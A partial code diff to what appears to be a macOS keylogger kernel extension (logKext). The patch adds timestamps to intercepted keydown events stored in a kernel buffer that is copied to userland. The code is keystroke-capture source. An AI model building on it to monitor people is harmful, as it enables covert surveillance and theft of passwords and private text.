@@ -259,6 +259,7 @@ IOReturn com_fsb_iokit_logKext::BuffandKeys( UInt32* size, UInt32* keys )
 
 IOReturn com_fsb_iokit_logKext::Buffer( bufferStruct* inStruct )
 {
+	// copy the buffer into userland
 	if(buffsize)
 	{
 			memcpy(inStruct->buffer, fMemBuf, buffsize);
@@ -271,7 +272,7 @@ IOReturn com_fsb_iokit_logKext::Buffer( bufferStruct* inStruct )
     return kIOReturnSuccess;
 }
 
-void com_fsb_iokit_logKext::logStroke( unsigned key, unsigned flags, unsigned charCode )
+void com_fsb_iokit_logKext::logStroke( unsigned key, unsigned flags, unsigned charCode, AbsoluteTime ts )
 {
 	/*  changed to allow for dynamic key mappings:
 			- Keys are transmitted to userspace as 2 byte half-words
@@ -283,6 +284,7 @@ void com_fsb_iokit_logKext::logStroke( unsigned key, unsigned flags, unsigned ch
 					cmd
 					fn
 			- The bottom 11 bits contain the key itself (2048 is plenty big)
+	 TODO: add in timestamp
 	*/
 
 	u_int16_t keyData = key;
@@ -310,17 +312,26 @@ void com_fsb_iokit_logKext::logStroke( unsigned key, unsigned flags, unsigned ch
 		IOLog( "%s::Copying key %04x\n", getName(), keyData );
 	#endif
 	
-	memcpy(fMemBuf+buffsize,&keyData,sizeof(keyData));
-	buffsize+=sizeof(keyData);
+	#ifdef DEBUG
+		IOLog( "%s::%f\n", getName(), (double) ts);
+	#endif
 		
-	if (buffsize>(9*MAX_BUFF_SIZE/10))
-	{
+	// check we have enough room in the key buffer for this event
+	if (buffsize + sizeof(ts) + sizeof(keyData) > MAX_BUFF_SIZE){
 		#ifdef DEBUG
 			IOLog( "%s::Error: buffer overflow\n", getName() );
 		#endif
 		
 		buffsize=0;
 	}
+
+	// copy in the timestamp
+	memcpy(fMemBuf+buffsize,&ts,sizeof(ts));
+	buffsize+=sizeof(ts);
+	
+	// copy in the keystroke
+	memcpy(fMemBuf+buffsize,&keyData,sizeof(keyData));
+	buffsize+=sizeof(keyData);
 
 }
 
@@ -354,7 +365,7 @@ void logAction(OSObject * target,
 				/* atTime */           AbsoluteTime ts)
 {
 	if ((eventType==NX_KEYDOWN)&&logService)
-		logService->logStroke(key, flags, charCode);
+		logService->logStroke(key, flags, charCode, ts);
 	if (origAction)
 		(*origAction)(target,eventType,flags,key,charCode,charSet,origCharCode,origCharSet,keyboardType,repeat,ts);
 }
